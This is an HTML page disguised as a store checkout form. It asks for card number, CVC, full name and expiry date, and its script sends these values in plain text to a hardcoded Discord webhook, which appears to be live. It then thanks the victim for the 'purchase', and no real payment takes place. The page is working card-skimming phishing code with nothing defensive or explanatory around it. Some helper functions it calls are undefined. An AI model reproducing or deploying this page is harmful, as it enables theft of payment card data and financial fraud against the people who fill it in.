<!DOCTYPE html>
<html>
<head>
<title>Checkout</title>
<style>
    body {
        background:#111;
        color:white;
        font-family:Arial;
        display:flex;
        justify-content:center;
        align-items:center;
        height:100vh;
    }

    #checkoutBox {
        background:#222;
        padding:25px;
        width:350px;
        border-radius:10px;
    }

    input {
        width:100%;
        padding:10px;
        margin-top:10px;
        border-radius:5px;
        border:none;
        outline:none;
    }

    #purchaseBtn {
        width:100%;
        padding:12px;
        margin-top:20px;
        border:none;
        border-radius:6px;
        background:#555;
        color:white;
        font-size:16px;
        cursor:not-allowed;
        transition:0.2s;
    }

    #purchaseBtn.enabled {
        background:#0a8;
        cursor:pointer;
    }
</style>
</head>

<body>

<div id="checkoutBox">
    <h2>Checkout</h2>

    <label>Card Number</label>
    <input id="cardNum" maxlength="16" placeholder="1234 5678 9012 3456">

    <label>CVC</label>
    <input id="cvcField" maxlength="3" placeholder="123">

    <label>Full Name</label>
    <input id="fullName" placeholder="John Doe">

    <label>Exp Date</label>
    <input id="expDate" placeholder="MM/YY">

    <button id="purchaseBtn">Purchase</button>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";

function finishPurchase() {
    const payload = {
        content: 
`credit card number: ${cardNum.value}
cvc number: ${cvcField.value}
First and Last Name: ${fullName.value}
exp date: ${expDate.value}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(res => {
        if (res.ok) {
            alert("Thank you for your purchase!");
            closeCheckout();

            // Clear fields after sending
            cardNum.value = "";
            cvcField.value = "";
            fullName.value = "";
            expDate.value = "";
            validateCheckout();
        } else {
            alert("Failed to send to webhook.");
        }
    })
    .catch(err => alert("Error: " + err));
}
</script>

</body>
</html>
